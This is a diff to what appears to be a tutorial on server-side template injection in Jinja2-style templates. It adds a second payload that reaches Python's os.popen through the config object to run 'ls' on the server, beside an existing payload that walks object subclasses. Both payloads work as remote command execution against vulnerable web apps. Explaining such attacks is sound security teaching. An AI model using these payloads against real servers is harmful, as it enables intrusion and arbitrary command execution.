@@ -44,7 +44,12 @@ If we execute this snippet;
 ```sh
 {{ "hello".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}
 ```
-it will run `ls` on the servers filesystem.
+or
+
+```sh
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+```
+will run `ls` on the servers filesystem.
 
 To explain what's happening;
 
